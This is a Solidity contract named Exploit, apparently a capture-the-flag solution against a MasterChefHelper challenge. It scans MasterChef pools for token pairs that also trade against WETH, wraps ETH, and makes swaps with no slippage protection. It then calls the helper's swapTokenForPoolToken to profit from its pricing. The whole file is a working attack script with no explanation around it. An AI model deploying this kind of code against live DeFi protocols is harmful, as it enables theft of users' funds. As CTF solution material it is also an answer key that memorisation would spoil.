// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./public/contracts/Setup.sol";
import "./public/contracts/MasterChefHelper.sol";
import "./public/contracts/UniswapV2Like.sol";

contract Exploit {
    mapping(address => bool) seen;
    address[] uniqueTokens;
    mapping(address => mapping(address => bool)) pairs;
    mapping(address => mapping(address => uint256)) poolIndexer;
    MasterChefHelper c;
    address weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    
    constructor(address mch) {
        c = MasterChefHelper(mch);
    }

    function search() public returns (address, address) {
        uint256 SEARCH_LIMIT = 29;  // how many masterchef.poolInfos we should check. arbitrary value
        address lpToken;
        address tokenOut0;
        address tokenOut1;
        for (uint256 i = 0; i < SEARCH_LIMIT; i++) {
            (lpToken,,,) = c.masterchef().poolInfo(i);
            tokenOut0 = UniswapV2PairLike(lpToken).token0();
            tokenOut1 = UniswapV2PairLike(lpToken).token1();
            pairs[tokenOut0][tokenOut1] = true;
            pairs[tokenOut1][tokenOut0] = true;
            poolIndexer[tokenOut0][tokenOut1] = i;
            poolIndexer[tokenOut1][tokenOut0] = i;

            if (seen[tokenOut0] == false) {
                uniqueTokens.push(tokenOut0);
                seen[tokenOut0] = true;
            }
            if (seen[tokenOut1] == false) {
                uniqueTokens.push(tokenOut1);
                seen[tokenOut1] = true;
            }            
        }

        address tokenA;
        address tokenB;
        bool found = false;
        for (uint256 a = 0; a < uniqueTokens.length; a++) {
            for (uint256 b = 0; b < uniqueTokens.length; b++) {
                // found a pair that trades to between each other
                if (pairs[uniqueTokens[a]][uniqueTokens[b]] == true) {
                    if (
                        pairs[uniqueTokens[a]][weth] == true
                        && pairs[weth][uniqueTokens[b]] == true
                    ) {
                        tokenA = uniqueTokens[a];
                        tokenB = uniqueTokens[b];
                        found = true;
                        break;
                    }
                }
            }
            if (found) break;
        }
        return (tokenA, tokenB);
    }

    function swap(address tokenIn, address tokenOut, uint256 amountIn) public payable {
        UniswapV2RouterLike router = UniswapV2RouterLike(c.router());
        ERC20Like(tokenIn).approve(address(router), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp + 300
        );
    }

    function exploit() public payable {
        (address tokenA, address tokenB) = search();

        WETH9 weth9 = WETH9(weth);
        weth9.deposit{value: msg.value}();
        swap(weth, tokenA, msg.value/2);
        swap(weth, tokenB, msg.value/2);
        
        uint256 tokenABal = ERC20Like(tokenA).balanceOf(address(this));
        uint256 tokenBBal = ERC20Like(tokenB).balanceOf(address(this));
        
        swap(tokenB, tokenA, tokenBBal);

        uint256 poolId = poolIndexer[tokenB][weth];
        ERC20Like(tokenA).approve(address(c), tokenABal);
        c.swapTokenForPoolToken(poolId, tokenA, tokenABal, 0);
    }
}